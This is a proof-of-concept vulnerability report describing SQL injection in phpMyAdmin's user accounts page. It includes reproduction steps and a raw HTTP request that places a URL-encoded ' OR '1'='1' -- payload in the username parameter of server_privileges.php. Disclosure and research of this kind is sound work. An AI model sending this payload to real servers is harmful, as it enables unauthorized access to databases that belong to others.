# Vulnerability Type

SQL Injection

# Description

In phpMyAdmin 4 before 4.9.4 and 5 before 5.0.1, SQL injection exists in the user accounts page. A malicious user could inject custom SQL in place of their own username when creating queries to this page. An attacker must have a valid MySQL account to access the server.

# PoC Report

 ## Environment Setup

 - Software Link: https://github.com/phpmyadmin/phpmyadmin/
 - Version: 5.0.0
 - Tested on: Windows

 ## Exploit Description

The `username` parameter is vulnerable to SQL injection due to lack of input filtering. The injection is reachable only when the `ajax_request` and `validate_username` path constraints are satisfied.

 ## Steps to Reproduce

  1. Log in phpmyadmin.
  2. Intercept and send the malicious request using a web proxy tool such as Burp Suite, ensure it includes a valid session cookie.
  3. Observe the result.

 ## Proof Of Concept
```
GET /server_privileges.php?ajax_request=true&validate_username=set&username=%27%20OR%20%271%27%3D%271%27%20--%20 HTTP/1.1
Host: phpmyadmin
Connection: close

# Additional conditions:
# - The attacker must have a valid MySQL account to access the server.
```

